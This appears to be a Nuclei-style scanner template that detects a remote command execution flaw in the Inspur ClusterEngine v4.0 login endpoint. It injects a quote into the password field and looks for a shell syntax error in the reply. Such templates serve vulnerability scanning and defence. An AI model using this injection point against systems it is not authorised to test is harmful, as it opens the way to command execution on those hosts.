id: poc-yaml-inspur-clusterengine-rce
info:
  name: Inspur ClusterEngine v4.0 Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - method: POST
    path:
      - "{{BaseURL}}/login"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "op=login&username=asd&password=asd'"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{\"err\""
          - "syntax error: unexpected end of file"
        part: body
